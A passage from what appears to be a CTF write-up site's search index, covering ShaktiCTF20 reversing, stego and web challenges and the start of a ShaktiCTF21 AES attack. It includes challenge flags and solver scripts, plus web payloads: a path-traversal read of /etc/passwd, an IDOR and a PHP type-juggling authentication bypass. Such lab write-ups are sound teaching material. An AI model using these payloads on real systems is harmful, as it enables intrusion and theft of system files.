hopefully was backed up. Could you figure out the passcode and run the program successfully.","title":"Challenge Description"},{"location":"ShaktiCTF20/reversing/damez/#short-writeup","text":"String Compare. The flag is hardcoded in the binary. If you simply do strings challfile you get all the strings in the program. One of them is the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/reversing/damez/#flag","text":"shaktictf{K33p_th3_gam3_g0ing_gurl!}","title":"Flag"},{"location":"ShaktiCTF20/reversing/intro/","text":"Reversing Challenge Name Level Author Concept damEz Very Easy dhr33ti string compare Assemble! Easy imm0rt4l_5t4rk assembly EZ Easy bl4ck_Widw windows PYthn Easy bl4ck_Widw python reversing REach The Moon Medium imm0rt4l_5t4rk z3 XOXO Hard 4lex1 game based","title":"Reversing"},{"location":"ShaktiCTF20/reversing/intro/#reversing","text":"Challenge Name Level Author Concept damEz Very Easy dhr33ti string compare Assemble! Easy imm0rt4l_5t4rk assembly EZ Easy bl4ck_Widw windows PYthn Easy bl4ck_Widw python reversing REach The Moon Medium imm0rt4l_5t4rk z3 XOXO Hard 4lex1 game based","title":"Reversing"},{"location":"ShaktiCTF20/reversing/reach_the_moon/","text":"REach The Moon Challenge author imm0rt4l_5t4rk Challenge points: 200 Challenge solves: 6 Challenge Description Enter the correct flag to reach the moon. Your input will include shaktictf{} in it. Keep that in mind. Solution In the challenge the program asks us to input two strings eac of which is of length 17. Using the two strings various operations are conducted using them and the result is stored in a check array. The check array is being compared to a string of length 20 which is shaktictf{N0FL4GY3t?} . If it passes the comparison it gives us the flag(which was our input itself). Otherwise if it fails it returns Not there yett. To solve such a challenge where we have to find a probable answer consisting of many equations and conditions that are not solvable by hand or are time taking we generally use python tools such as z3-solver or angr. Below is a z3 script to get one definite solution based on the conditions given in the challenge. from z3 import * a1 = [ BitVec(\"a1[0]\", 16), BitVec(\"a1[1]\", 16), BitVec(\"a1[2]\", 16), BitVec(\"a1[3]\", 16), BitVec(\"a1[4]\", 16), BitVec(\"a1[5]\", 16), BitVec(\"a1[6]\", 16), BitVec(\"a1[7]\", 16), BitVec(\"a1[8]\", 16), BitVec(\"a1[9]\", 16), BitVec(\"a1[10]\", 16), BitVec(\"a1[11]\", 16), BitVec(\"a1[12]\", 16), BitVec(\"a1[13]\", 16), BitVec(\"a1[14]\", 16), BitVec(\"a1[15]\", 16), BitVec(\"a1[16]\", 16) ] a2 = [ BitVec(\"a2[0]\", 16), BitVec(\"a2[1]\", 16), BitVec(\"a2[2]\", 16), BitVec(\"a2[3]\", 16), BitVec(\"a2[4]\", 16), BitVec(\"a2[5]\", 16), BitVec(\"a2[6]\", 16), BitVec(\"a2[7]\", 16), BitVec(\"a2[8]\", 16), BitVec(\"a2[9]\", 16), BitVec(\"a2[10]\", 16), BitVec(\"a2[11]\", 16), BitVec(\"a2[12]\", 16), BitVec(\"a2[13]\", 16), BitVec(\"a2[14]\", 16), BitVec(\"a2[15]\", 16), BitVec(\"a2[16]\", 16) ] check = \"shaktictf{0Fl4gY3t?}\"; c = [] for i in range(len(check)): c.append(ord(check[i])) s = Solver() for i in range(17): s.add(a1[i]>40, a1[i]<127) s.add(a2[i]>40, a2[i]<127) s.add(c[0] == a1[0]) #We have hardcoded the starting characters to be 'shaktictf{' and last character to be '}' because it says in the s.add(c[1] == a1[1]) #description that the input will have the flag format in it. s.add(c[2] == a1[2]) s.add(c[3] == a1[3]) s.add(c[4] == a1[4]) s.add(c[5] == a1[5]) s.add(c[6] == a1[6]) s.add(c[7] == a1[7]) s.add(c[8] == a1[8]) s.add(c[9] == a1[9]) s.add(c[19] == a2[16]) print(s.check()) s.add(c[0] == (a1[0] - 71) ^ a2[0]) s.add(c[1] == LShR(a1[1],2) + (a2[1] - 0x7)) print(s.check()) s.add(c[2] == (3 * (a2[2] - (a1[2] ^ 0x2d))) - 0x14) s.add(c[3] == (2 * (a1[3] - a2[3])) ^ 0x1b) s.add(c[4] == (a1[4] + a2[4]) ^ 0xa7) s.add(c[5] == a1[5] & (a2[5] + 0x6f)) s.add(c[6] == (a1[6] % a2[6]) + 0x33) s.add(c[7] == (a1[7] ^ 0x61) + a2[7]) s.add(c[8] == (~a1[8] + 0xbd) ^ a2[8]) s.add(c[9] == (a2[9] ^ 0x30) + (a1[9] ^ 0x42)) s.add(c[19] == (LShR(a1[16], 0x2) + (a2[16] ^ 0x1d))) s.add(a2[0] == a2[10]) s.add(c[10] == LShR(a2[11], a1[11] / 0x1f)) s.add(c[11] == (a2[3] - a1[11]) * 0x23) s.add(c[12] == a2[12] ^ a1[12] ^ 0x46) s.add(c[13] == (~a2[13] % 0x100) - a1[12]) s.add(c[14] == a2[13]) s.add(c[15] == LShR(a2[14],0xc1) - (~a1[13] ^ 0x7)) s.add(c[16] == (a1[14] % 0x7a) + (a2[14] % 0x73) - 0xb8) s.add(c[17] == (a2[14] % 0x73) + (~a1[15] + 0x33)) s.add(c[18] == a1[16] % 118 & a2[15] ^ 10) l = ((a2[0] ^ 4) ^ 31) s.add(a1[10] == l) s.add(a1[10] == a2[15] + 5) s.add(a2[15] == 63) print(s.check()) #print(s.model()) m = s.model() w = '' x = '' for i in range(17): w += chr(m[a1[i]].as_long()) x += chr(m[a2[i]].as_long()) print(w) print(x) Thus our two inputs become shaktictf{D1d_y0u and _Us3_z3_0r_aNgr?} Flag shaktictf{D1d_y0u_Us3_z3_0r_aNgr?}","title":"REach The Moon"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#reach-the-moon","text":"Challenge author imm0rt4l_5t4rk Challenge points: 200 Challenge solves: 6","title":"REach The Moon"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#challenge-description","text":"Enter the correct flag to reach the moon. Your input will include shaktictf{} in it. Keep that in mind.","title":"Challenge Description"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#solution","text":"In the challenge the program asks us to input two strings eac of which is of length 17. Using the two strings various operations are conducted using them and the result is stored in a check array. The check array is being compared to a string of length 20 which is shaktictf{N0FL4GY3t?} . If it passes the comparison it gives us the flag(which was our input itself). Otherwise if it fails it returns Not there yett. To solve such a challenge where we have to find a probable answer consisting of many equations and conditions that are not solvable by hand or are time taking we generally use python tools such as z3-solver or angr. Below is a z3 script to get one definite solution based on the conditions given in the challenge. from z3 import * a1 = [ BitVec(\"a1[0]\", 16), BitVec(\"a1[1]\", 16), BitVec(\"a1[2]\", 16), BitVec(\"a1[3]\", 16), BitVec(\"a1[4]\", 16), BitVec(\"a1[5]\", 16), BitVec(\"a1[6]\", 16), BitVec(\"a1[7]\", 16), BitVec(\"a1[8]\", 16), BitVec(\"a1[9]\", 16), BitVec(\"a1[10]\", 16), BitVec(\"a1[11]\", 16), BitVec(\"a1[12]\", 16), BitVec(\"a1[13]\", 16), BitVec(\"a1[14]\", 16), BitVec(\"a1[15]\", 16), BitVec(\"a1[16]\", 16) ] a2 = [ BitVec(\"a2[0]\", 16), BitVec(\"a2[1]\", 16), BitVec(\"a2[2]\", 16), BitVec(\"a2[3]\", 16), BitVec(\"a2[4]\", 16), BitVec(\"a2[5]\", 16), BitVec(\"a2[6]\", 16), BitVec(\"a2[7]\", 16), BitVec(\"a2[8]\", 16), BitVec(\"a2[9]\", 16), BitVec(\"a2[10]\", 16), BitVec(\"a2[11]\", 16), BitVec(\"a2[12]\", 16), BitVec(\"a2[13]\", 16), BitVec(\"a2[14]\", 16), BitVec(\"a2[15]\", 16), BitVec(\"a2[16]\", 16) ] check = \"shaktictf{0Fl4gY3t?}\"; c = [] for i in range(len(check)): c.append(ord(check[i])) s = Solver() for i in range(17): s.add(a1[i]>40, a1[i]<127) s.add(a2[i]>40, a2[i]<127) s.add(c[0] == a1[0]) #We have hardcoded the starting characters to be 'shaktictf{' and last character to be '}' because it says in the s.add(c[1] == a1[1]) #description that the input will have the flag format in it. s.add(c[2] == a1[2]) s.add(c[3] == a1[3]) s.add(c[4] == a1[4]) s.add(c[5] == a1[5]) s.add(c[6] == a1[6]) s.add(c[7] == a1[7]) s.add(c[8] == a1[8]) s.add(c[9] == a1[9]) s.add(c[19] == a2[16]) print(s.check()) s.add(c[0] == (a1[0] - 71) ^ a2[0]) s.add(c[1] == LShR(a1[1],2) + (a2[1] - 0x7)) print(s.check()) s.add(c[2] == (3 * (a2[2] - (a1[2] ^ 0x2d))) - 0x14) s.add(c[3] == (2 * (a1[3] - a2[3])) ^ 0x1b) s.add(c[4] == (a1[4] + a2[4]) ^ 0xa7) s.add(c[5] == a1[5] & (a2[5] + 0x6f)) s.add(c[6] == (a1[6] % a2[6]) + 0x33) s.add(c[7] == (a1[7] ^ 0x61) + a2[7]) s.add(c[8] == (~a1[8] + 0xbd) ^ a2[8]) s.add(c[9] == (a2[9] ^ 0x30) + (a1[9] ^ 0x42)) s.add(c[19] == (LShR(a1[16], 0x2) + (a2[16] ^ 0x1d))) s.add(a2[0] == a2[10]) s.add(c[10] == LShR(a2[11], a1[11] / 0x1f)) s.add(c[11] == (a2[3] - a1[11]) * 0x23) s.add(c[12] == a2[12] ^ a1[12] ^ 0x46) s.add(c[13] == (~a2[13] % 0x100) - a1[12]) s.add(c[14] == a2[13]) s.add(c[15] == LShR(a2[14],0xc1) - (~a1[13] ^ 0x7)) s.add(c[16] == (a1[14] % 0x7a) + (a2[14] % 0x73) - 0xb8) s.add(c[17] == (a2[14] % 0x73) + (~a1[15] + 0x33)) s.add(c[18] == a1[16] % 118 & a2[15] ^ 10) l = ((a2[0] ^ 4) ^ 31) s.add(a1[10] == l) s.add(a1[10] == a2[15] + 5) s.add(a2[15] == 63) print(s.check()) #print(s.model()) m = s.model() w = '' x = '' for i in range(17): w += chr(m[a1[i]].as_long()) x += chr(m[a2[i]].as_long()) print(w) print(x) Thus our two inputs become shaktictf{D1d_y0u and _Us3_z3_0r_aNgr?}","title":"Solution"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#flag","text":"shaktictf{D1d_y0u_Us3_z3_0r_aNgr?}","title":"Flag"},{"location":"ShaktiCTF20/reversing/xoxo/","text":"XOXO Challenge Description During the early days of Apollo, software was not taken as seriously as other engineering disciplines. Though in fact we had a complex system of systems, we weren\u2019t getting credit for what was a legitimate field. It was out of desperation I came up with the term, to say: \u201cHey, we\u2019re engineering too.\u201d Lets play by my rules. Writeup The game does not let the player play at anyposition also does not let the server play at any position. But finally a pattern is achieved once all positions are filled but again this has to be achieved in a certain sequence which is to be obtained deom the final check matrix function which checks if the input sequence was in this order : l=[7,51, 3, 73, 71, 2, 35, 77, 6, 79, 26, 38, 53, 27, 44, 78, 45, 21, 36, 33, 59, 29, 17, 5, 56, 42, 24, 47, 18, 9, 74, 20, 75, 54, 23, 22, 60, 63, 57, 1, 62] Initially you need to open the binary using ghidra and open the disassembly view using the code browser from ghidra. On the left side you can see the symbol table where every function from the program is listed and from there you can search for the main function to get the starting point of the program. As you go through the program you can see the other functions and from the names of the function you can see that there is a function called the seq_check which sounds fishy. And if you go through it you can see a check. here the sequence array is hard coded and on xoring these values with 0x1337 you get the sequence in which you should give your input. Script from pwn import * user_seq = ['8', '52', '4', '74', '72', '3', '36', '78', '7', '80', '27', '39', '54', '28', '45', '79', '46', '22', '37', '34', '60', '30', '18', '6', '57', '43', '25', '48', '19', '10', '75', '21', '76', '55', '24', '23', '61', '64', '58', '2', '63'] #user_seq = ['7', '51', '3', '73', '71', '2', '35', '77', '6', '79', '26', '38', '53', '27', '44', '78', '45', '21', '36', '33', '59', '29', '17', '5', '56', '42', '24', '47', '18', '9', '74', '20', '75', '54', '23', '22', '60', '63', '57', '1', '62'] #io=process(\"./a.out\") io= remote(\"0.0.0.0\", 1111) for i in range(len(user_seq)): print(\"running \"+str(i)) io.recv() io.sendline(bytes(user_seq[i],'utf-8')) print(io.recvall()) Flag is obtained when sequence is achieved. Flag shaktictf{XOXO_g0n3_to0_f4r_??_XD}","title":"XOXO"},{"location":"ShaktiCTF20/reversing/xoxo/#xoxo","text":"","title":"XOXO"},{"location":"ShaktiCTF20/reversing/xoxo/#challenge-description","text":"During the early days of Apollo, software was not taken as seriously as other engineering disciplines. Though in fact we had a complex system of systems, we weren\u2019t getting credit for what was a legitimate field. It was out of desperation I came up with the term, to say: \u201cHey, we\u2019re engineering too.\u201d Lets play by my rules.","title":"Challenge Description"},{"location":"ShaktiCTF20/reversing/xoxo/#writeup","text":"The game does not let the player play at anyposition also does not let the server play at any position. But finally a pattern is achieved once all positions are filled but again this has to be achieved in a certain sequence which is to be obtained deom the final check matrix function which checks if the input sequence was in this order : l=[7,51, 3, 73, 71, 2, 35, 77, 6, 79, 26, 38, 53, 27, 44, 78, 45, 21, 36, 33, 59, 29, 17, 5, 56, 42, 24, 47, 18, 9, 74, 20, 75, 54, 23, 22, 60, 63, 57, 1, 62] Initially you need to open the binary using ghidra and open the disassembly view using the code browser from ghidra. On the left side you can see the symbol table where every function from the program is listed and from there you can search for the main function to get the starting point of the program. As you go through the program you can see the other functions and from the names of the function you can see that there is a function called the seq_check which sounds fishy. And if you go through it you can see a check. here the sequence array is hard coded and on xoring these values with 0x1337 you get the sequence in which you should give your input.","title":"Writeup"},{"location":"ShaktiCTF20/reversing/xoxo/#script","text":"from pwn import * user_seq = ['8', '52', '4', '74', '72', '3', '36', '78', '7', '80', '27', '39', '54', '28', '45', '79', '46', '22', '37', '34', '60', '30', '18', '6', '57', '43', '25', '48', '19', '10', '75', '21', '76', '55', '24', '23', '61', '64', '58', '2', '63'] #user_seq = ['7', '51', '3', '73', '71', '2', '35', '77', '6', '79', '26', '38', '53', '27', '44', '78', '45', '21', '36', '33', '59', '29', '17', '5', '56', '42', '24', '47', '18', '9', '74', '20', '75', '54', '23', '22', '60', '63', '57', '1', '62'] #io=process(\"./a.out\") io= remote(\"0.0.0.0\", 1111) for i in range(len(user_seq)): print(\"running \"+str(i)) io.recv() io.sendline(bytes(user_seq[i],'utf-8')) print(io.recvall()) Flag is obtained when sequence is achieved.","title":"Script"},{"location":"ShaktiCTF20/reversing/xoxo/#flag","text":"shaktictf{XOXO_g0n3_to0_f4r_??_XD}","title":"Flag"},{"location":"ShaktiCTF20/stego/hidd3n/","text":"Hidd3n Challenge Description Seems like there is something hidden in this image. Can you find it out? Short writeup The string given in the Comment section of exiftool is base64 encoded. Decode it and we get a passphrase. Use steghide and enter the passphrase to view the flag. Challenge Author v1Ru5 Flag shaktictf{G00d!_b3st_0f_luck_f0r_th3_n3xt_chall3nge}","title":"Hidd3n"},{"location":"ShaktiCTF20/stego/hidd3n/#hidd3n","text":"","title":"Hidd3n"},{"location":"ShaktiCTF20/stego/hidd3n/#challenge-description","text":"Seems like there is something hidden in this image. Can you find it out?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/hidd3n/#short-writeup","text":"The string given in the Comment section of exiftool is base64 encoded. Decode it and we get a passphrase. Use steghide and enter the passphrase to view the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/hidd3n/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/hidd3n/#flag","text":"shaktictf{G00d!_b3st_0f_luck_f0r_th3_n3xt_chall3nge}","title":"Flag"},{"location":"ShaktiCTF20/stego/intro/","text":"Steganography Challenge Name Level Author Concept Invisible Very Easy v1Ru5 stegsnow,morse Just Crack It Easy v1Ru5 steghide,stegcracker Hidd3n Easy v1Ru5 exiftool,steghide Secret Medium v1Ru5 audacity Pretty Good Medium v1Ru5 pgp decryption","title":"Steganography"},{"location":"ShaktiCTF20/stego/intro/#steganography","text":"Challenge Name Level Author Concept Invisible Very Easy v1Ru5 stegsnow,morse Just Crack It Easy v1Ru5 steghide,stegcracker Hidd3n Easy v1Ru5 exiftool,steghide Secret Medium v1Ru5 audacity Pretty Good Medium v1Ru5 pgp decryption","title":"Steganography"},{"location":"ShaktiCTF20/stego/invisible/","text":"Invisible Stego Author : v1Ru5 Challenge Description One of our engineer got some clues regarding a recent attack in the city, using her knowledge on networking. Can you connect the dots and help us? Flag Format : shaktictf{STRING} Short writeup: The image file is a rabbit hole. Perform stegsnow on the text file and decode the morse to get the flag. flag : shaktictf{AM1V1SIBL3N0W}","title":"Invisible"},{"location":"ShaktiCTF20/stego/invisible/#invisible","text":"","title":"Invisible"},{"location":"ShaktiCTF20/stego/invisible/#stego","text":"Author : v1Ru5","title":"Stego"},{"location":"ShaktiCTF20/stego/invisible/#challenge-description","text":"One of our engineer got some clues regarding a recent attack in the city, using her knowledge on networking. Can you connect the dots and help us? Flag Format : shaktictf{STRING}","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/invisible/#short-writeup","text":"The image file is a rabbit hole. Perform stegsnow on the text file and decode the morse to get the flag. flag : shaktictf{AM1V1SIBL3N0W}","title":"Short writeup:"},{"location":"ShaktiCTF20/stego/just_crack_it/","text":"Just Crack It Challenge Description One of our Network Security Analyst intercepted the communication between some spies from other country and concluded that they used two images to transmit the message. Can you help us? Short writeup Perform 'stegcracker hacker.jpg ' and use that password (14ms0c00l!) while performing 'steghide extract -sf laptop.jpg' to get the flag. Challenge Author v1Ru5 Flag shaktictf{y0u_M4d3_iT_85284501}","title":"Just Crack It"},{"location":"ShaktiCTF20/stego/just_crack_it/#just-crack-it","text":"","title":"Just Crack It"},{"location":"ShaktiCTF20/stego/just_crack_it/#challenge-description","text":"One of our Network Security Analyst intercepted the communication between some spies from other country and concluded that they used two images to transmit the message. Can you help us?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/just_crack_it/#short-writeup","text":"Perform 'stegcracker hacker.jpg ' and use that password (14ms0c00l!) while performing 'steghide extract -sf laptop.jpg' to get the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/just_crack_it/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/just_crack_it/#flag","text":"shaktictf{y0u_M4d3_iT_85284501}","title":"Flag"},{"location":"ShaktiCTF20/stego/pretty_good/","text":"Pretty Good Challenge Description Ever since she got to know about this privacy technique, she believed that this was the best encryption method. Can you prove her wrong by finding out the message? Short writeup Perform zbarimg on the qrcode to get the private key and and jsteg and strings on the second image to get the message and passphrase. Use any pgp decryption tool and decode the obtained ROT13 message to see the flag. Challenge Author v1Ru5 Flag skaktictf{jU5t_dr1nk_m0r3_c0ff33}","title":"Pretty Good"},{"location":"ShaktiCTF20/stego/pretty_good/#pretty-good","text":"","title":"Pretty Good"},{"location":"ShaktiCTF20/stego/pretty_good/#challenge-description","text":"Ever since she got to know about this privacy technique, she believed that this was the best encryption method. Can you prove her wrong by finding out the message?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/pretty_good/#short-writeup","text":"Perform zbarimg on the qrcode to get the private key and and jsteg and strings on the second image to get the message and passphrase. Use any pgp decryption tool and decode the obtained ROT13 message to see the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/pretty_good/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/pretty_good/#flag","text":"skaktictf{jU5t_dr1nk_m0r3_c0ff33}","title":"Flag"},{"location":"ShaktiCTF20/stego/secret/","text":"Secret Challenge Description An American computer network engineer tried to convey something about a breach that happened recently, but we couldn't understand anything. We have a recording of her conversation with us. Can you help us in retrieving the information? Short writeup Open the file in hex editor and change the file header. Open the file using Audacity and reverse the audio. Change the speed and listen carefully. Challenge Author v1Ru5 Flag shaktictf{th15_w45_4n_e4sy_ch4lleng3}","title":"Secret"},{"location":"ShaktiCTF20/stego/secret/#secret","text":"","title":"Secret"},{"location":"ShaktiCTF20/stego/secret/#challenge-description","text":"An American computer network engineer tried to convey something about a breach that happened recently, but we couldn't understand anything. We have a recording of her conversation with us. Can you help us in retrieving the information?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/secret/#short-writeup","text":"Open the file in hex editor and change the file header. Open the file using Audacity and reverse the audio. Change the speed and listen carefully.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/secret/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/secret/#flag","text":"shaktictf{th15_w45_4n_e4sy_ch4lleng3}","title":"Flag"},{"location":"ShaktiCTF20/web/ador/","text":"Ador Challenge Description Ada was born on 10 December 1815 not 12, identification change makes a difference Short Writeup In the source code, you will find that name parameter is set to a default user, when we login with name as \"admin\", we get an idor and receive flag. Payload= ?name=admin Flag shaktictf{f1r5t_c0mpu73r_pr0gr4mm3r}","title":"Ador"},{"location":"ShaktiCTF20/web/ador/#ador","text":"","title":"Ador"},{"location":"ShaktiCTF20/web/ador/#challenge-description","text":"Ada was born on 10 December 1815 not 12, identification change makes a difference","title":"Challenge Description"},{"location":"ShaktiCTF20/web/ador/#short-writeup","text":"In the source code, you will find that name parameter is set to a default user, when we login with name as \"admin\", we get an idor and receive flag. Payload= ?name=admin","title":"Short Writeup"},{"location":"ShaktiCTF20/web/ador/#flag","text":"shaktictf{f1r5t_c0mpu73r_pr0gr4mm3r}","title":"Flag"},{"location":"ShaktiCTF20/web/authen/","text":"Authen Challenge Description Ada is important to the world, she is important for a reason Short Writeup In the login, check source code, decode the weak authentication of password to get flag (console.log(String.fromCharCode(115, 104, 97, 107, 116, 105, 99, 116, 102, 123, 98, 51, 121, 48, 110, 100, 95, 112, 117, 114, 51, 95, 99, 52, 108, 99, 117, 108, 97, 116, 105, 48, 110, 115, 125)); Flag shaktictf{b3y0nd_pur3_c4lculati0ns}","title":"Authen"},{"location":"ShaktiCTF20/web/authen/#authen","text":"","title":"Authen"},{"location":"ShaktiCTF20/web/authen/#challenge-description","text":"Ada is important to the world, she is important for a reason","title":"Challenge Description"},{"location":"ShaktiCTF20/web/authen/#short-writeup","text":"In the login, check source code, decode the weak authentication of password to get flag (console.log(String.fromCharCode(115, 104, 97, 107, 116, 105, 99, 116, 102, 123, 98, 51, 121, 48, 110, 100, 95, 112, 117, 114, 51, 95, 99, 52, 108, 99, 117, 108, 97, 116, 105, 48, 110, 115, 125));","title":"Short Writeup"},{"location":"ShaktiCTF20/web/authen/#flag","text":"shaktictf{b3y0nd_pur3_c4lculati0ns}","title":"Flag"},{"location":"ShaktiCTF20/web/biscuits/","text":"Biscuits Author m0n574 Challenge Description Ada Lovelace used to love eating french biscuits during her work Short Writeup The cookie has the flag which should be hex decoded Flag shaktictf{c00k13s_m4k3_phr3n0l0gy&m3sm3r15m_3asy}","title":"Biscuits"},{"location":"ShaktiCTF20/web/biscuits/#biscuits","text":"","title":"Biscuits"},{"location":"ShaktiCTF20/web/biscuits/#author","text":"m0n574","title":"Author"},{"location":"ShaktiCTF20/web/biscuits/#challenge-description","text":"Ada Lovelace used to love eating french biscuits during her work","title":"Challenge Description"},{"location":"ShaktiCTF20/web/biscuits/#short-writeup","text":"The cookie has the flag which should be hex decoded","title":"Short Writeup"},{"location":"ShaktiCTF20/web/biscuits/#flag","text":"shaktictf{c00k13s_m4k3_phr3n0l0gy&m3sm3r15m_3asy}","title":"Flag"},{"location":"ShaktiCTF20/web/doors/","text":"Doors Challenge Description Ada Loves to travel to places, London-Paris-Spain and discover more Short Writeup You have to lfi to /etc/password via the ?page= paramater eg ?page=../../../etc/passwd Flag shaktictf{c4lculu5_0f_7h3_n3rv0u5_5y5t3m}","title":"Doors"},{"location":"ShaktiCTF20/web/doors/#doors","text":"","title":"Doors"},{"location":"ShaktiCTF20/web/doors/#challenge-description","text":"Ada Loves to travel to places, London-Paris-Spain and discover more","title":"Challenge Description"},{"location":"ShaktiCTF20/web/doors/#short-writeup","text":"You have to lfi to /etc/password via the ?page= paramater eg ?page=../../../etc/passwd","title":"Short Writeup"},{"location":"ShaktiCTF20/web/doors/#flag","text":"shaktictf{c4lculu5_0f_7h3_n3rv0u5_5y5t3m}","title":"Flag"},{"location":"ShaktiCTF20/web/intro/","text":"Web Exploitation Challenge Name Level Author Concept Ador Easy m0n574 Idor Authen Easy m0n574 Weak authentication check Biscuits Easy m0n574 Vulnerable Cookie Machine Easy m0n574 Crawlers Doors Medium m0n574 LFI PHPhar Medium m0n574 PHP vulnerabilities","title":"Web Exploitation"},{"location":"ShaktiCTF20/web/intro/#web-exploitation","text":"Challenge Name Level Author Concept Ador Easy m0n574 Idor Authen Easy m0n574 Weak authentication check Biscuits Easy m0n574 Vulnerable Cookie Machine Easy m0n574 Crawlers Doors Medium m0n574 LFI PHPhar Medium m0n574 PHP vulnerabilities","title":"Web Exploitation"},{"location":"ShaktiCTF20/web/machine/","text":"Machine Author m0n574 Challenge Description Babbage was impressed by Lovelace's intellect and analytic skills that he called her a humanoid Short Writeup The robots.txt files shows the disallowed files where the flag is kept Flag shaktictf{7h3_3nch4n7r355_0f_Nu3b3r}","title":"Machine"},{"location":"ShaktiCTF20/web/machine/#machine","text":"","title":"Machine"},{"location":"ShaktiCTF20/web/machine/#author","text":"m0n574","title":"Author"},{"location":"ShaktiCTF20/web/machine/#challenge-description","text":"Babbage was impressed by Lovelace's intellect and analytic skills that he called her a humanoid","title":"Challenge Description"},{"location":"ShaktiCTF20/web/machine/#short-writeup","text":"The robots.txt files shows the disallowed files where the flag is kept","title":"Short Writeup"},{"location":"ShaktiCTF20/web/machine/#flag","text":"shaktictf{7h3_3nch4n7r355_0f_Nu3b3r}","title":"Flag"},{"location":"ShaktiCTF20/web/phphar/","text":"PHPhar Challenge Description Explaining the Analytical Engine's function was a difficult task, bypass the basic php to see what she tried to explain Short Writeup bypass first function by giving an exponential value, second check by giving a decimal value with total 13 letters and the value before the . being 1337, for third check use array indice manipulation of the two parameters being checked to bypass the sha1 check, for the fourth check, provide a md4 with 0e followed by xxxx which would be a loose comparison with 0e and for the last check use an array to bypass the strcmp() Payload --> flag0=9e9&secret=1337.12345678&a[0]=asd&b[1]=dsf&md4=0e251288019&abc[]=sdff Flag shaktictf{An4ly71c4l_Eng1n3!=D1ff3r3nc3_Eng1n3}","title":"PHPhar"},{"location":"ShaktiCTF20/web/phphar/#phphar","text":"","title":"PHPhar"},{"location":"ShaktiCTF20/web/phphar/#challenge-description","text":"Explaining the Analytical Engine's function was a difficult task, bypass the basic php to see what she tried to explain","title":"Challenge Description"},{"location":"ShaktiCTF20/web/phphar/#short-writeup","text":"bypass first function by giving an exponential value, second check by giving a decimal value with total 13 letters and the value before the . being 1337, for third check use array indice manipulation of the two parameters being checked to bypass the sha1 check, for the fourth check, provide a md4 with 0e followed by xxxx which would be a loose comparison with 0e and for the last check use an array to bypass the strcmp() Payload --> flag0=9e9&secret=1337.12345678&a[0]=asd&b[1]=dsf&md4=0e251288019&abc[]=sdff","title":"Short Writeup"},{"location":"ShaktiCTF20/web/phphar/#flag","text":"shaktictf{An4ly71c4l_Eng1n3!=D1ff3r3nc3_Eng1n3}","title":"Flag"},{"location":"ShaktiCTF21/crypto/AES/","text":"Awesome Encryption Scheme Authored by: Sowmya (@__4lpha__) Challenge Script: from Crypto.Cipher import AES from Crypto.Util.Padding import pad from hashlib import md5 from os import urandom from flag import flag keys = [md5(urandom(3)).digest() for _ in range(2)] def bytexor(da,ta): return bytes(i^j for i,j in zip(da,ta)) def get_ciphers(iv1, iv2): return [ AES.new(keys[0], mode=AES.MODE_CBC, iv=iv1), AES.new(keys[1], mode=AES.MODE_CFB, iv=iv2, segment_size=8*16), ] def encrypt(m: bytes, iv1: bytes, iv2: bytes) -> bytes: m = pad(m,32) ciphers = get_ciphers(iv1, iv2) c = m for cipher in ciphers: c = b''.join(i[16:]+bytexor(i[:16],cipher.encrypt(i[16:])) for i in [c[i:i+32] for i in range(0,len(c),32)]) return c plaintext = f'finally now i am able to send my secret with double security and double trust, {flag}'.encode() iv1, iv2 = urandom(16),urandom(16) ciphertext = encrypt(plaintext, iv1, iv2) ciphertext = b\":\".join([x.hex().encode() for x in [iv1, iv2, ciphertext]]) open('encrypted','wb').write(ciphertext) Output: c486732c526c5b60bc29bae6926644eb:5fe355033095d413e601a7ede00fca1d:fd68e8732bb6e9b5672730eb1ed3f2fe9c88b5503e3fb08747ce3dd17296e383ccb76b78587bb1bd1337574073a185e9d846aeab36929d0101e433a34db0cf9ed034abb473a2280624d430c39e58c245603f56a4ddb1127a9f74051481440bbbe53fd95bc8a2a9a3f3488c68d1d9fa8e82cb40dce3df7b2d1c22fca0d05d08c9d197e053586643b32d3dbd4421996ad6abf2a1a930eb16609303471808bac90b This is a customised encryption scheme. So let's take a look at the block diagram to get better understanding of the encryption scheme. Enryption Block Diagram: Message-Block ---------------------------------------------------- | L0 | R0 | ---------------------------------------------------- | | | ------------- | V | | | \u2295 <-------| AES-CBC |<------| | | | | | ------------- | | | | | -------------------------| | \\ | \\ | |---------------------------\\-- | \\ | | V Meet V ---------------------------------------------------- | L1 == R0 | L2 == R1 | ---------------------------------------------------- | | | ------------- | V | | | \u2295 <-------| AES-CFB |<------| | | | | | ------------- | | | | | -------------------------| | \\ | \\ | |---------------------------\\-- | \\ | | V Cipher-Block V ---------------------------------------------------- | L2 | R2 | ---------------------------------------------------- Observation: If we notice the block diagram we can say that the encryption function is using two rounds of fiestal structure * Now we have L1||R1 * Key is a hash of 3 random bytes (can be bruteforced) We can find the key used for AES-CBC by using L0, R0, R1(L2) : * Since R1 = L0 ^ E( R0 ) where E stands for CBC-Encryption -> R1 = L0 ^ E( R0 ) -> R1 ^ L0 = E(R0) -> L2 ^ L0 = E(R0) Now we have a pair of plaintext & ciphertext pair which help in bruteforcing the CBC-key In detail: keys = [ md5(bytes([i,j,k])).digest() for i in range(256) for j in range(256) for k in range(256) ] key1 = [ i for i in keys if bytexor(pt[:16],AES.new(i,AES.MODE_CBC,iv1).encrypt(pt[16:32])) == ct[:16] ][0] We can find the key used for AES-CFB by using L2, R2, L1(R0) : * Since R2 = L1 ^ E( R1 ) where E stands for CBC-Encryption -> R2 = L1 ^ E( R1 ) -> R2 ^ L1 = E( R1 ) -> R2 ^ R0 = E( L2 ) Now we have a pair 